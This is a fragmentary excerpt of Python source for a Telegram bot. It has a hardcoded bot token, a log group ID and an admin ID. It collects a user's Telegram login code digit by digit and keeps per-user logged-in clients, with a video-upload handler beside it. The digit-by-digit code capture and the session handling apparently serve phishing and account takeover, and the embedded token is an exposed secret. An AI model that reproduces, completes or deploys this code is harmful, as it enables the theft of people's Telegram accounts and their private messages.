...
BOT_TOKEN = "8431133693:AAE5dT5lDbdb5D5tyHotfA38V4c0rqMXvn4"
LOG_GROUP_ID = "-1003702346444"
ADMIN_ID = "7461769509"
API_ID = 30191201
...
async def process_phone_code(message: types.Message, state: FSMContext):
    ...
    if len(phone_code_input) == 1 and phone_code_input.isdigit():
        ...
        if len(new_code) < 5:
            ...
            await message.answer(
                f"🔢 **Current OTP:** `{new_code}`\n\nPlease enter {5-len(new_code)} more digit(s) to complete OTP.",
                parse_mode='Markdown'
            )
            return
        else:
    ...
    try:
        ...
        await message.answer(f"❌ **OTP Error!**\n\n{type(e).__name__}. Please start again with /start", parse_mode='Markdown')
        if client:
            await client.disconnect()
            del user_clients[message.from_user.id]
        await state.clear()
...
async def handle_video_upload(message: types.Message):
    try:
        ...
        await message.answer(
            f"✅ **Video Uploaded Successfully!**\n\n📁 File Name: `{original_filename}`\n💾 File Size: {message.video.file_size} bytes\n⏰ Auto-delete: After 15 minutes\n📊 Total videos: {len(get_all_videos())}\n\n🔗 Unique ID: `{unique_id}`",
            parse_mode='Markdown'
        )
    except Exception as e:
